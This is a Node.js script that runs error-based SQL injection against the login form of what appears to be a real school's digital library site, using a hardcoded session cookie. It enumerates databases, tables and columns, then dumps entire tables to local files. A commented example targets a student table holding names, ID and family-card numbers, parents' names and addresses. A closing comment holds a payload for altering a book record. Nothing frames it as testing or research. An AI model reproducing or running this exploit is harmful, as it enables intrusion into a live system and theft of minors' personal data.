const axios = require('axios');
const axiosRetry = require('axios-retry').default;
const { URLSearchParams } = require('url');
const fs = require('fs');
const path = require('path');
const { argv } = require('process');

axiosRetry(axios, { retries: 3, retryDelay: axiosRetry.exponentialDelay });

const beforeTime = Date.now();
let env = undefined;

try {
    // require('dotenv').config({ path: (argv[0]) });
    console.log(argv[2])
    env = fs.readFileSync(path.join(__dirname, argv[2]), 'utf8')
    .split('\n')
    .filter(line => line.trim() !== '' && !line.startsWith('#'))
    .reduce((acc, line) => {
        const [key, value] = line.split('=');
        acc[key] = value.replace("\r", "");
        return acc;
    }, {});
} catch(err) {}

const targetURL = 'https://digilib.smktexmaco-smg.sch.id/Login/get_login';
const cookie = 'ci_session=k8itih4f8jv1rhbcmbghvev72k';

const target_database = env?.DATABASE ? env.DATABASE?.trim() || 'siatex_masterdb' : argv[2];
const target_table = env?.TABLE?.trim() || '';
const target_columns = env?.COLUMNS?.trim() || '';
let target_condition = env?.CONDITION?.trim().replace(" is ", " = ") || ``;
const target_search = argv[3] || undefined;

if (target_search) target_condition = `CONCAT(${target_columns}) LIKE '%${target_search}%'`;

// const target_database = 'siatex_masterdb';
// const target_table = 'ms_siswa';
// const target_columns = 'tahun_sis, idskh_sis, nisis_sis, nmasw_sis, idkel_sis, idagm_sis, notlp_sis, email_sis, almat_sis, tglsw_sis, sklah_sis, nmayh_sis, nmibu_sis, idgda_sis, extra_sis, nonik_sis, nmrkk_sis';
// const target_condition = `tahun_sis > 2022'`;

const filename = env?.FILENAME?.trim() || `temp.txt`;
const dumpPath = path.join(__dirname, 'dump');

async function req(payload, retries = 3) {
    const data = new URLSearchParams();
    data.append('nmapg_pgw', payload);
    data.append('paspw_pgw', 'test');

    try {
        const response = await axios.post(targetURL, data.toString(), {
        headers: {
            'Cookie': cookie,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'Referer': 'https://digilib.smktexmaco-smg.sch.id/login'
        },
        validateStatus: () => true,
        
        // timeout: 10000
        });

        const dataa = `${response.data}`;
        const startIndex = dataa.indexOf("XPATH syntax error: '");
        const endIndex = dataa.lastIndexOf("'</p>");

        if (startIndex && endIndex) {
            const ress = dataa.replace("\\", "").substring(startIndex+21, endIndex-1);
            // console.log(data.toString());
            // console.log("Res ORI:");
            // console.log(dataa);
            // console.log("Res FILTER:");
            // console.log(ress);
            return ress;
        }

        // const errorPattern = /XPATH syntax error: '\\[^']*'/;
        // const match = errorPattern.exec(response.data);
        
        // if (match) {
        //     const errorMessage = match[0];
        //     const extracted = errorMessage.replace("\\", "").substring(21);
        //     return extracted.substring(0, extracted.length-1);
        // }

        return null;

    } catch (error) {
        if (retries <= 0) {
            console.error("REQ ERROR: ", error);
            return null;
        }

        retries -= 1;

        console.log(`Retrying... (${retries} left)`);
        await delay(2000);
        
        return req(payload, retries);
    }
}

// async function get(payload, { delayMs = 0, log = true } = {}) {
//     if (log) console.log("Scanning...");

//     let current = 1;
//     let length = 31;
//     let _break = false;
//     const _payload = payload.replace('{sub2}', length);

//     let data = [];

//     while (!_break) {
//         try {
//             const r = await req(_payload.replace('{sub1}', current));

//             if (!r) {
//                 _break = true;
//                 if (log) console.log("Scanned!");
//             }

//             current += length;
//             data.push(r);

//             if (log) console.log(`- `, r);
//         } catch(err) {
//             _break = true;
//             console.log("Error: ", err);
//         }

//         if (delayMs) await delay(delayMs);
//     }

//     return data.join("");
// }
let temp_columns = '';

async function get(payload, { log = true } = { log: true }) {
    if (log) console.log("Scanning...");

    let current = 1;
    let length = 31;
    const lengthPayload = payload.replace("SUBSTRING", "CHAR_LENGTH").replace(", {sub1}, {sub2}", "");
    const lengthData = Number(await req(lengthPayload));
    const steps = Math.floor(lengthData / length) < (lengthData / length) ? Math.floor(lengthData / length) + 1 : Math.floor(lengthData / length);
    const _payload = payload.replace('{sub2}', length);

    let data = {};
    let currentStep = 0;

    console.log(`CHAR: ${lengthData}`);
    if (!lengthData) {
        if (log) {
            console.log('STOPPED!');
            console.log(`Payload Length: ${lengthPayload}`);
            console.log(`Payload Data: ${_payload}`);
        }
        return Object.values(data).join("");
    }

    const requestSize = 100;

    for (let i = 0; i < steps; i+=requestSize) {

        await new Promise((res) => {
            let count = 0;
            for (let _i = 0; _i < (steps - i < requestSize ? steps - i : requestSize); _i++) {
                let index = i + _i;
                const step = `${index}`;

                if (log) console.log(`SEND: ${index + 1}/${steps}`);

                const _reqPayload = _payload.replace('{sub1}', current);

                req(_reqPayload).then((r) => {
                    currentStep++;

                    if (r === null && log) {
                        console.log(`GET STEP [${step}]: Error!`);
                        console.log(`Error! `, _reqPayload);
                    }
                    else {
                        if (log) console.log(`GET: ${currentStep}/${steps} [${step}]`);
                        data[Number(step)] = r;
                    }
                }).finally(() => {
                    count++;
                    if (count >= (steps - i < requestSize ? steps - i : requestSize)) {
                        res(true);
                    }
                });

                current += length;
            }
        });

        if (env?.ACTION.trim() === "tabledata" && !target_search) {
            try {
                const header = `| ${temp_columns.replaceAll(",", " | ")} |\n|${temp_columns.split(",").map(() => '----').join("|")}|\n`;
                save(header + Object.values(data).join(""), filename, "\n");
                console.log(`Progress saved to ${filename}`);
            } catch(err) {}
        }
    }

    if (log) console.log(`SCANNED! [${currentStep}/${steps}]`);

    return Object.values(data).join("");
}

// async function get(payload, { log = true } = { log: true }) {
//     if (log) console.log("Scanning...");

//     let current = 1;
//     let length = 31;
//     const lengthPayload = payload.replace("SUBSTRING", "CHAR_LENGTH").replace(", {sub1}, {sub2}", "");
//     const lengthData = Number(await req(lengthPayload));
//     const steps = Math.floor(lengthData / length) < (lengthData / length) ? Math.floor(lengthData / length) + 1 : Math.floor(lengthData / length);
//     const _payload = payload.replace('{sub2}', length);

//     let data = {};
//     let currentStep = 0;

//     console.log(`CHAR: ${lengthData}`);
//     if (!lengthData) {
//         if (log) {
//             console.log('STOPPED!');
//             console.log(`Payload Length: ${lengthPayload}`);
//             console.log(`Payload Data: ${_payload}`);
//         }
//         return Object.values(data).join("");
//     }

//     let isMoving = Date.now();

//     for (let index = 0; index < steps; index++) {
//         const step = `${index}`;

//         if (log) console.log(`SEND: ${index + 1}/${steps}`);

//         const _reqPayload = _payload.replace('{sub1}', current);

//         isMoving = Date.now();

//         // try {
//         //     currentStep++;
//         //     const r = await req(_reqPayload);
            
//         //     isMoving = Date.now();

//         //     if (r === null && log) {
//         //         console.log(`GET STEP [${step}]: Error!`);
//         //         console.log(`Error! `, _reqPayload);
//         //     }
//         //     else {
//         //         if (log) console.log(`GET: ${currentStep}/${steps} [${step}]`);
//         //         data[Number(step)] = r;
//         //     }
//         // } catch(err) {
//         //     console.error("LOOP: ", err);
//         // }

//         req(_reqPayload).then((r) => {
//             currentStep++;
//             isMoving = Date.now();

//             if (r === null && log) {
//                 console.log(`GET STEP [${step}]: Error!`);
//                 console.log(`Error! `, _reqPayload);
//             }
//             else {
//                 if (log) console.log(`GET: ${currentStep}/${steps} [${step}]`);
//                 data[Number(step)] = r;
//             }
//         });

//         current += length;
//     }

//     await new Promise((res, rej) => {
//         const interval = setInterval(() => {
//             if (currentStep >= steps) {
//                 res();
//                 clearInterval(interval);
//             }
            
//             const totalDetik = Math.floor((Date.now() - isMoving) / 1000);

//             if (totalDetik > 60) {
//                 res();
//                 clearInterval(interval);
//             }
//         }, 1000);
//     });

//     if (log) console.log(`SCANNED! [${currentStep}/${steps}]`);

//     return Object.values(data).join("");
// }

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function getDatabases() {
    const payload = `' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT GROUP_CONCAT(schema_name SEPARATOR ';') FROM information_schema.schemata), {sub1}, {sub2})))-- -`;
    const data = await get(payload);

    return data;
}

async function getTables(database = target_columns) {
    const payload = `' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT GROUP_CONCAT(table_name SEPARATOR ';') FROM information_schema.tables WHERE table_schema = '${database}'), {sub1}, {sub2})))-- -`;
    const data = await get(payload);

    return data;
    
}

async function getColumns(database = target_database, table = target_table) {
    const payload = `' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT GROUP_CONCAT(column_name SEPARATOR ';') FROM information_schema.columns WHERE table_schema='${database}' AND table_name='${table}'), {sub1}, {sub2}))) -- -`;
    const data = await get(payload);

    console.log(data);
    return data;
}

async function getTableData(database = target_database, table = target_table, columns = target_columns) {
    // const payload = `' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT GROUP_CONCAT(CONCAT_WS(' | ', email)) FROM 'texmaco_webdb'.'tb_contact'))) -- -`;
    const payload = `' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT GROUP_CONCAT(CONCAT_WS(' | ', ${columns}) SEPARATOR ';') FROM ${database}.${table}${target_condition ? ` WHERE ${target_condition}` : ''}), {sub1}, {sub2}))) -- -`;
    // const payload = `' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT @@version))) -- -`;
    const data = await get(payload);

    return data;
}
// ' AND EXTRACTVALUE(1, CONCAT(0x5c, SUBSTRING((SELECT GROUP_CONCAT(CONCAT_WS(' | ', nis) SEPARATOR ';') FROM siatex_masterdb.tb_nilaiujian WHERE nis = 237935), 1, 31))) -- -
async function save(data, name = filename, join = "\n") {
    
    const _path = path.join(dumpPath, name);
    fs.writeFile(_path, join ? (join + data.split(";").join(join)) : data, "utf-8", (err) => {
        if (err) return;

        console.log(`Saved: ${name}`);
        console.log(_path);
    });
}

async function saveCustom(payload, name = filename, join) {
    const data = await get(payload);
    
    const _path = path.join(dumpPath, name);

    fs.writeFile(_path, join ? (join + data.split(";").join(join)) : data, "utf-8", (err) => {
        if (err) return;

        console.log(`Saved: ${name}`);
        console.log(_path);
    });
}

async function saveDatabases(join = "\n- ") {
    const data = await getDatabases();
    save(data, undefined, join)
}

async function saveTables(database = target_database, join = "\n- ") {
    const data = await getTables(database);
    save(data, undefined, join)
}

async function saveTableData(columns = target_columns, table = target_table, database = target_database, file = filename) {
    if (!columns.trim()) columns = (await getColumns()).replaceAll(";", ",");
    temp_columns = columns;
    const data = await getTableData(database, table, columns);

    if (target_search) {
        console.log(columns);
        console.log(data);
        return;
    }
    
    const header = `| ${columns.replaceAll(",", " | ")} |\n|${columns.split(",").map(() => '----').join("|")}|\n`;
    save(header + data, file, "\n")
}

async function saveColumns(table = target_table, database = target_database, join = "\n- ") {
    const data = await getColumns(database, table);
    save(data, undefined, join)
}

async function saveDatabaseTables(database = target_database) {
    console.log(`Database: ${database}`);

    const _path = path.join(dumpPath, database);

    try { fs.mkdirSync(_path); } catch(err) {}
    
    const tables = process.argv[3]?.split(",") || (await getTables(database)).split(";");
    console.log(`Tables:\n- ${tables.join("\n- ")}`);

    for (const table of tables) {
        try {
            console.log(`Progress ${table}...`);

            const columns = (await getColumns(database, table)).replaceAll(";", ",");

            const name = `${table}.md`
            const data = await getTableData(database, table, columns);
            const header = `| ${columns.replaceAll(",", " | ")} |\n|${columns.split(",").map(() => '----').join("|")}|\n`;

            fs.writeFileSync(path.join(_path, name), header + data, "utf-8");

            console.log(`Saved: ${database}/${name}`);
        } catch(err) {}
    }

    console.log(`DONEEEEEEEEE!`);
}

async function customPayload() {
    // const payload = argv[2].split("=").filter((v, i) => i >= 2).join("=");
    const payload = argv[2].split("=")[1];
    console.log(payload);

    const data = await get(payload);

    console.log(data);
    return data;
}

(async () => {
    if (argv[2].startsWith("--payload=")) {
        customPayload();
        return;
    }

    console.log(env?.ACTION);
    console.log(env);

    if (!env?.ACTION) await saveDatabaseTables();
    else if (env?.ACTION.trim() === "tabledata") await saveTableData();
    else if (env?.ACTION.trim() === "columns") await saveColumns();
    else if (env?.ACTION.trim() === "tables") await saveTables();
    else if (env?.ACTION.trim() === "databases") await saveDatabases();
    else if (env?.ACTION.trim() === "databasetable") await saveDatabaseTables();
    else console.log('No Action!');

    const selisih = formatDuration(Date.now() - beforeTime);
    console.log(`Done! ${selisih}`)
})();

function formatDuration(ms) {
    const totalDetik = Math.floor(ms / 1000);
    const jam = Math.floor(totalDetik / 3600);
    const menit = Math.floor((totalDetik % 3600) / 60);
    const detik = totalDetik % 60;

    return `${jam.toString().padStart(2, '0')}:${menit.toString().padStart(2, '0')}:${detik.toString().padStart(2, '0')}`;
}

// ' OR EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 1 FROM (UPDATE `ms_buku` SET judul = 'HIDUP JOKOWI' WHERE id_buku = 8) AS x))) -- -